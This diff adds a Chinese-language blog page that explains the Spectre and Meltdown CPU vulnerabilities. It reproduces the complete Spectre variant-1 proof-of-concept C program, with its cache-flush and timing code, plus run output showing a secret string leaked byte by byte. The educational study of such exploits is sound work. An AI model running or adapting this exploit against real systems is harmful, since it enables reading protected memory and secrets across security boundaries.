@@ -1,0 +1,788 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/linux.png">
+  <link rel="icon" type="image/png" href="/img/linux.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#000000">
+  <meta name="description" content="开发">
+  <meta name="author" content="Jianliang·Shen">
+  <meta name="keywords" content="">
+  <title>Spectre漏洞和原理 - BLOGLOVIN</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/an-old-hope.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>BLOGLOVIN</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                链接
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default_flight.jpeg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2024-03-26 21:56" pubdate>
+      2024年3月26日 晚上
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      35
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">Spectre漏洞和原理</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h2><span id="幽灵漏洞">幽灵漏洞</span></h2><p>2018年，Google安全团队披露了Meltdown（CVE-2017-5754）和Spectre漏洞（CVE-2017-5715/5753）。这是利用CPU乱序执行和分支预测，通过旁路攻击（侧信道攻击）获取内存中的重要数据，或者注入故障使目标瘫痪。数以亿计的Intel、AMD和ARM的CPU受到影响。</p>
+<span id="more"></span>
+
+<h2><span id="简介">简介</span></h2><p>乱序执行和分支预测是为了提高性能，而软件系统厂商发布补丁，加强安全检查，降低了性能。相比乱序执行的Meltdown漏洞，幽灵漏洞影响范围更为广泛。</p>
+<ul>
+<li>乱序执行：乱序执行通过允许程序指令流中的指令与前面的指令并行执行，有时在前面的指令之前并行执行，增加CPU利用率。</li>
+<li>分支预测：<ul>
+<li>处理器保持当前的寄存器状态，对程序将遵循的路径做出预测，并提前沿着预测路径执行指令。如果预测被证明是正确的，则提交推测执行的结果(即保存)，从而在等待期间产生优于空闲的性能优势。</li>
+<li>如果预测失败，通过恢复其寄存器状态并沿着正确的路径恢复，放弃其推测执行的工作。</li>
+</ul>
+</li>
+</ul>
+<p>预测失败时的执行路径，缓存中存在预测时提前执行的残留，这是此漏洞的关键之处。</p>
+<h2><span id="攻击方法">攻击方法</span></h2><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (x &lt; array1_size) &#123;
+    y = array2[array1[x] * <span class="hljs-number">4096</span>];
+&#125;</code></pre></div>
+
+<ul>
+<li>将array2从缓存中擦除，确保存放在内存中</li>
+<li>多次输入有效的x，使得分支预测器为真</li>
+<li>输入越界的x，对应机密字节k = array1[x]</li>
+<li>分支预测使得array2[k]对应的一片数据加载到Cache中，这里大小是4KB</li>
+<li>攻击者通过访问array2的所有4KB的数据，根据缓存命中时间（远快于内存访问）以此推断出k的值。</li>
+</ul>
+<h2><span id="代码">代码</span></h2><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _MSC_VER</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;intrin.h&gt;</span>        <span class="hljs-comment">/* for rdtscp and clflush */</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> optimize(<span class="hljs-meta-string">&quot;gt&quot;</span>,on)</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;x86intrin.h&gt;</span>     <span class="hljs-comment">/* for rdtscp and clflush */</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
+
+<span class="hljs-comment">/********************************************************************</span>
+<span class="hljs-comment">Victim code.</span>
+<span class="hljs-comment">********************************************************************/</span>
+<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> array1_size = <span class="hljs-number">16</span>;
+<span class="hljs-keyword">uint8_t</span> unused1[<span class="hljs-number">64</span>];
+<span class="hljs-keyword">uint8_t</span> array1[<span class="hljs-number">160</span>] = &#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span> &#125;;
+<span class="hljs-keyword">uint8_t</span> unused2[<span class="hljs-number">64</span>]; 
+<span class="hljs-keyword">uint8_t</span> array2[<span class="hljs-number">256</span> * <span class="hljs-number">512</span>];
+
+<span class="hljs-keyword">char</span> *secret = <span class="hljs-string">&quot;The Magic Words are Squeamish Ossifrage.&quot;</span>;
+
+<span class="hljs-keyword">uint8_t</span> temp = <span class="hljs-number">0</span>;  <span class="hljs-comment">/* Used so compiler won&#x27;t optimize out victim_function() */</span>
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">victim_function</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> x)</span> </span>&#123;
+    <span class="hljs-keyword">if</span> (x &lt; array1_size) &#123;
+        temp &amp;= array2[array1[x] * <span class="hljs-number">512</span>];
+    &#125;
+&#125;
+
+
+<span class="hljs-comment">/********************************************************************</span>
+<span class="hljs-comment">Analysis code</span>
+<span class="hljs-comment">********************************************************************/</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CACHE_HIT_THRESHOLD (80)  <span class="hljs-comment">/* assume cache hit if time &lt;= threshold */</span></span>
+
+<span class="hljs-comment">/* Report best guess in value[0] and runner-up in value[1] */</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">readMemoryByte</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> malicious_x, <span class="hljs-keyword">uint8_t</span> value[<span class="hljs-number">2</span>], <span class="hljs-keyword">int</span> score[<span class="hljs-number">2</span>])</span> </span>&#123;
+    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> results[<span class="hljs-number">256</span>];
+    <span class="hljs-keyword">int</span> tries, i, j, k, mix_i, junk = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">size_t</span> training_x, x;
+    <span class="hljs-keyword">register</span> <span class="hljs-keyword">uint64_t</span> time1, time2;
+    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">uint8_t</span> *addr;
+
+    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)
+        results[i] = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span> (tries = <span class="hljs-number">999</span>; tries &gt; <span class="hljs-number">0</span>; tries--) &#123;
+
+        <span class="hljs-comment">/* Flush array2[256*(0..255)] from cache */</span>
+        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)
+            _mm_clflush(&amp;array2[i * <span class="hljs-number">512</span>]);  <span class="hljs-comment">/* intrinsic for clflush instruction */</span>
+
+        <span class="hljs-comment">/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */</span>
+        training_x = tries % array1_size;
+        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">29</span>; j &gt;= <span class="hljs-number">0</span>; j--) &#123;
+            _mm_clflush(&amp;array1_size);
+            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> z = <span class="hljs-number">0</span>; z &lt; <span class="hljs-number">100</span>; z++) &#123;&#125;  <span class="hljs-comment">/* Delay (can also mfence) */</span>
+
+            <span class="hljs-comment">/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */</span>
+            <span class="hljs-comment">/* Avoid jumps in case those tip off the branch predictor */</span>
+            x = ((j % <span class="hljs-number">6</span>) - <span class="hljs-number">1</span>) &amp; ~<span class="hljs-number">0xFFFF</span>;   <span class="hljs-comment">/* Set x=FFF.FF0000 if j%6==0, else x=0 */</span>
+            x = (x | (x &gt;&gt; <span class="hljs-number">16</span>));           <span class="hljs-comment">/* Set x=-1 if j&amp;6=0, else x=0 */</span>
+            x = training_x ^ (x &amp; (malicious_x ^ training_x));
+            
+            <span class="hljs-comment">/* Call the victim! */</span>
+            victim_function(x);
+        &#125;
+
+        <span class="hljs-comment">/* Time reads. Order is lightly mixed up to prevent stride prediction */</span>
+        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;
+            mix_i = ((i * <span class="hljs-number">167</span>) + <span class="hljs-number">13</span>) &amp; <span class="hljs-number">255</span>;
+            addr = &amp;array2[mix_i * <span class="hljs-number">512</span>];
+            time1 = __rdtscp(&amp;junk);            <span class="hljs-comment">/* READ TIMER */</span>
+            junk = *addr;                       <span class="hljs-comment">/* MEMORY ACCESS TO TIME */</span>
+            time2 = __rdtscp(&amp;junk) - time1;    <span class="hljs-comment">/* READ TIMER &amp; COMPUTE ELAPSED TIME */</span>
+            <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD &amp;&amp; mix_i != array1[tries % array1_size])
+                results[mix_i]++;  <span class="hljs-comment">/* cache hit - add +1 to score for this value */</span>
+        &#125;
+
+        <span class="hljs-comment">/* Locate highest &amp; second-highest results results tallies in j/k */</span>
+        j = k = <span class="hljs-number">-1</span>;
+        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;
+            <span class="hljs-keyword">if</span> (j &lt; <span class="hljs-number">0</span> || results[i] &gt;= results[j]) &#123;
+                k = j;
+                j = i;
+            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (k &lt; <span class="hljs-number">0</span> || results[i] &gt;= results[k]) &#123;
+                k = i;
+            &#125;
+        &#125;
+        <span class="hljs-keyword">if</span> (results[j] &gt;= (<span class="hljs-number">2</span> * results[k] + <span class="hljs-number">5</span>) || (results[j] == <span class="hljs-number">2</span> &amp;&amp; results[k] == <span class="hljs-number">0</span>))
+            <span class="hljs-keyword">break</span>;  <span class="hljs-comment">/* Clear success if best is &gt; 2*runner-up + 5 or 2/0) */</span>
+    &#125;
+    results[<span class="hljs-number">0</span>] ^= junk;  <span class="hljs-comment">/* use junk so code above won&#x27;t get optimized out*/</span>
+    value[<span class="hljs-number">0</span>] = (<span class="hljs-keyword">uint8_t</span>)j;
+    score[<span class="hljs-number">0</span>] = results[j];
+    value[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">uint8_t</span>)k;
+    score[<span class="hljs-number">1</span>] = results[k];
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;
+    <span class="hljs-keyword">size_t</span> malicious_x=(<span class="hljs-keyword">size_t</span>)(secret-(<span class="hljs-keyword">char</span>*)array1);   <span class="hljs-comment">/* default for malicious_x */</span>
+    <span class="hljs-keyword">int</span> i, score[<span class="hljs-number">2</span>], len=<span class="hljs-number">40</span>;
+    <span class="hljs-keyword">uint8_t</span> value[<span class="hljs-number">2</span>];
+
+    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(array2); i++)
+        array2[i] = <span class="hljs-number">1</span>;    <span class="hljs-comment">/* write to array2 so in RAM not copy-on-write zero pages */</span>
+    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">3</span>) &#123;
+        <span class="hljs-built_in">sscanf</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;%p&quot;</span>, (<span class="hljs-keyword">void</span>**)(&amp;malicious_x));
+        malicious_x -= (<span class="hljs-keyword">size_t</span>)array1;  <span class="hljs-comment">/* Convert input value into a pointer */</span>
+        <span class="hljs-built_in">sscanf</span>(argv[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;%d&quot;</span>, &amp;len);
+    &#125;
+    
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Reading %d bytes:\n&quot;</span>, len);
+    <span class="hljs-keyword">while</span> (--len &gt;= <span class="hljs-number">0</span>) &#123;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Reading at malicious_x = %p... &quot;</span>, (<span class="hljs-keyword">void</span>*)malicious_x);
+        readMemoryByte(malicious_x++, value, score);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: &quot;</span>, (score[<span class="hljs-number">0</span>] &gt;= <span class="hljs-number">2</span>*score[<span class="hljs-number">1</span>] ? <span class="hljs-string">&quot;Success&quot;</span> : <span class="hljs-string">&quot;Unclear&quot;</span>));
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%02X=&#x27;%c&#x27; score=%d    &quot;</span>, value[<span class="hljs-number">0</span>], 
+            (value[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">31</span> &amp;&amp; value[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">127</span> ? value[<span class="hljs-number">0</span>] : <span class="hljs-string">&#x27;?&#x27;</span>), score[<span class="hljs-number">0</span>]);
+        <span class="hljs-keyword">if</span> (score[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">0</span>)
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(second best: 0x%02X score=%d)&quot;</span>, value[<span class="hljs-number">1</span>], score[<span class="hljs-number">1</span>]);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
+    &#125;
+    <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>);
+&#125;</code></pre></div>
+
+<p><img src="/img/post_pics/os/Spectre.pic.jpg" alt="示意图"></p>
+<p>运行结果：</p>
+<div class="hljs"><pre><code class="hljs bash">Reading 40 bytes:
+Reading at malicious_x = 0xffffffffffffdfc8... Unclear: 0x54=<span class="hljs-string">&#x27;T&#x27;</span> score=999    (second best: 0x01 score=816)
+Reading at malicious_x = 0xffffffffffffdfc9... Unclear: 0x68=<span class="hljs-string">&#x27;h&#x27;</span> score=999    (second best: 0x01 score=835)
+Reading at malicious_x = 0xffffffffffffdfca... Unclear: 0x65=<span class="hljs-string">&#x27;e&#x27;</span> score=999    (second best: 0x01 score=845)
+Reading at malicious_x = 0xffffffffffffdfcb... Unclear: 0x20=<span class="hljs-string">&#x27; &#x27;</span> score=999    (second best: 0x01 score=801)
+Reading at malicious_x = 0xffffffffffffdfcc... Unclear: 0x4D=<span class="hljs-string">&#x27;M&#x27;</span> score=999    (second best: 0x01 score=784)
+Reading at malicious_x = 0xffffffffffffdfcd... Unclear: 0x61=<span class="hljs-string">&#x27;a&#x27;</span> score=999    (second best: 0x01 score=839)
+Reading at malicious_x = 0xffffffffffffdfce... Unclear: 0x67=<span class="hljs-string">&#x27;g&#x27;</span> score=999    (second best: 0x01 score=818)
+Reading at malicious_x = 0xffffffffffffdfcf... Unclear: 0x69=<span class="hljs-string">&#x27;i&#x27;</span> score=999    (second best: 0x01 score=848)
+Reading at malicious_x = 0xffffffffffffdfd0... Unclear: 0x63=<span class="hljs-string">&#x27;c&#x27;</span> score=999    (second best: 0x01 score=817)
+Reading at malicious_x = 0xffffffffffffdfd1... Unclear: 0x20=<span class="hljs-string">&#x27; &#x27;</span> score=999    (second best: 0x01 score=790)
+Reading at malicious_x = 0xffffffffffffdfd2... Unclear: 0x57=<span class="hljs-string">&#x27;W&#x27;</span> score=999    (second best: 0x01 score=833)
+Reading at malicious_x = 0xffffffffffffdfd3... Unclear: 0x6F=<span class="hljs-string">&#x27;o&#x27;</span> score=999    (second best: 0x01 score=796)
+Reading at malicious_x = 0xffffffffffffdfd4... Unclear: 0x72=<span class="hljs-string">&#x27;r&#x27;</span> score=999    (second best: 0x01 score=817)
+Reading at malicious_x = 0xffffffffffffdfd5... Unclear: 0x64=<span class="hljs-string">&#x27;d&#x27;</span> score=999    (second best: 0x01 score=797)
+Reading at malicious_x = 0xffffffffffffdfd6... Unclear: 0x73=<span class="hljs-string">&#x27;s&#x27;</span> score=999    (second best: 0x01 score=796)
+Reading at malicious_x = 0xffffffffffffdfd7... Unclear: 0x20=<span class="hljs-string">&#x27; &#x27;</span> score=999    (second best: 0x01 score=828)
+Reading at malicious_x = 0xffffffffffffdfd8... Unclear: 0x61=<span class="hljs-string">&#x27;a&#x27;</span> score=999    (second best: 0x01 score=815)
+Reading at malicious_x = 0xffffffffffffdfd9... Unclear: 0x72=<span class="hljs-string">&#x27;r&#x27;</span> score=999    (second best: 0x01 score=746)
+Reading at malicious_x = 0xffffffffffffdfda... Unclear: 0x65=<span class="hljs-string">&#x27;e&#x27;</span> score=999    (second best: 0x01 score=823)
+Reading at malicious_x = 0xffffffffffffdfdb... Unclear: 0x20=<span class="hljs-string">&#x27; &#x27;</span> score=999    (second best: 0x01 score=859)
+Reading at malicious_x = 0xffffffffffffdfdc... Unclear: 0x53=<span class="hljs-string">&#x27;S&#x27;</span> score=999    (second best: 0x01 score=842)
+Reading at malicious_x = 0xffffffffffffdfdd... Unclear: 0x71=<span class="hljs-string">&#x27;q&#x27;</span> score=999    (second best: 0x01 score=827)
+Reading at malicious_x = 0xffffffffffffdfde... Unclear: 0x75=<span class="hljs-string">&#x27;u&#x27;</span> score=999    (second best: 0x01 score=805)
+Reading at malicious_x = 0xffffffffffffdfdf... Unclear: 0x65=<span class="hljs-string">&#x27;e&#x27;</span> score=999    (second best: 0x01 score=781)
+Reading at malicious_x = 0xffffffffffffdfe0... Unclear: 0x61=<span class="hljs-string">&#x27;a&#x27;</span> score=999    (second best: 0x01 score=855)
+Reading at malicious_x = 0xffffffffffffdfe1... Unclear: 0x6D=<span class="hljs-string">&#x27;m&#x27;</span> score=999    (second best: 0x01 score=792)
+Reading at malicious_x = 0xffffffffffffdfe2... Unclear: 0x69=<span class="hljs-string">&#x27;i&#x27;</span> score=999    (second best: 0x01 score=840)
+Reading at malicious_x = 0xffffffffffffdfe3... Unclear: 0x73=<span class="hljs-string">&#x27;s&#x27;</span> score=999    (second best: 0x01 score=811)
+Reading at malicious_x = 0xffffffffffffdfe4... Unclear: 0x68=<span class="hljs-string">&#x27;h&#x27;</span> score=999    (second best: 0x01 score=784)
+Reading at malicious_x = 0xffffffffffffdfe5... Unclear: 0x20=<span class="hljs-string">&#x27; &#x27;</span> score=999    (second best: 0x01 score=794)
+Reading at malicious_x = 0xffffffffffffdfe6... Unclear: 0x4F=<span class="hljs-string">&#x27;O&#x27;</span> score=999    (second best: 0x01 score=863)
+Reading at malicious_x = 0xffffffffffffdfe7... Unclear: 0x73=<span class="hljs-string">&#x27;s&#x27;</span> score=999    (second best: 0x01 score=786)
+Reading at malicious_x = 0xffffffffffffdfe8... Unclear: 0x73=<span class="hljs-string">&#x27;s&#x27;</span> score=999    (second best: 0x01 score=832)
+Reading at malicious_x = 0xffffffffffffdfe9... Unclear: 0x69=<span class="hljs-string">&#x27;i&#x27;</span> score=999    (second best: 0x01 score=818)
+Reading at malicious_x = 0xffffffffffffdfea... Unclear: 0x66=<span class="hljs-string">&#x27;f&#x27;</span> score=999    (second best: 0x01 score=800)
+Reading at malicious_x = 0xffffffffffffdfeb... Unclear: 0x72=<span class="hljs-string">&#x27;r&#x27;</span> score=999    (second best: 0x01 score=785)
+Reading at malicious_x = 0xffffffffffffdfec... Unclear: 0x61=<span class="hljs-string">&#x27;a&#x27;</span> score=999    (second best: 0x01 score=816)
+Reading at malicious_x = 0xffffffffffffdfed... Unclear: 0x67=<span class="hljs-string">&#x27;g&#x27;</span> score=999    (second best: 0x01 score=784)
+Reading at malicious_x = 0xffffffffffffdfee... Unclear: 0x65=<span class="hljs-string">&#x27;e&#x27;</span> score=999    (second best: 0x01 score=845)
+Reading at malicious_x = 0xffffffffffffdfef... Unclear: 0x2E=<span class="hljs-string">&#x27;.&#x27;</span> score=999    (second best: 0x01 score=813)</code></pre></div>
+
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-cn/%E5%B9%BD%E7%81%B5%E6%BC%8F%E6%B4%9E">幽灵漏洞 - 维基百科，自由的百科全书 (wikipedia.org)</a><br><a target="_blank" rel="noopener" href="https://gist.github.com/anonymous/99a72c9c1003f8ae0707b4927ec1bd8a">The proof-of-concept code for “Spectre Attacks: Exploiting Speculative Execution”. (github.com)</a><br><a target="_blank" rel="noopener" href="https://github.com/cryptax/spectre-armv7/tree/master">cryptax/spectre-armv7: This is an attempt to implement Spectre on ARMv7 (github.com)</a><br><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5754">CVE - CVE-2017-5754 (mitre.org)</a><br><a target="_blank" rel="noopener" href="https://spectreattack.com/spectre.pdf">bounds check bypass (CVE-2017-5753)</a><br><a target="_blank" rel="noopener" href="https://spectreattack.com/spectre.pdf">branch target injection (CVE-2017-5715)</a><br><a target="_blank" rel="noopener" href="https://meltdownattack.com/meltdown.pdf">rogue data cache load (CVE-2017-5754)</a><br><a target="_blank" rel="noopener" href="https://www.alibabacloud.com/forum/read-2878">Security Bulletin] Intel Processor Meltdown and Specter Security Vulnerability Bulletin - Alibaba Cloud Developer Forums: Cloud Discussion Forums</a><br><a target="_blank" rel="noopener" href="https://github.com/hannob/meltdownspectre-patches">hannob/meltdownspectre-patches: Summary of the patch status for Meltdown / Spectre (github.com)</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32784852">给程序员解释Spectre和Meltdown漏洞 - 知乎 (zhihu.com)</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1043767">死磕Meltdown和Spectre漏洞，应对方案汇总-腾讯云开发者社区-腾讯云 (tencent.com)</a><br><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/170">继英特尔、ARM、AMD之后，苹果、高通、IBM均承认其处理器有被攻击风险 - 安全内参 | 决策者的网络安全知识库 (secrss.com)</a><br><a target="_blank" rel="noopener" href="https://support.google.com/faqs/answer/7622138?hl=en">产品状态：CPU 推理执行攻击方法 - Google帮助</a><br><a target="_blank" rel="noopener" href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=99d1c47c-cf58-406b-9b28-987dc3cc054a&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments">Endpoint Protection - Symantec Enterprise (broadcom.com)</a><br><a target="_blank" rel="noopener" href="https://www.ithome.com.tw/news/120312">10個Q&amp;A快速認識Meltdown與Spectre兩大CPU漏洞攻擊（內含各廠商修補進度大整理_1/10更新） | iThome</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/94179">360：处理器Meltdown与Spectre漏洞修复简要指南-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%AE%89%E5%85%A8/">安全</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/">
+                        <span class="hidden-mobile">密码学介绍和Mbedtls相关实现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
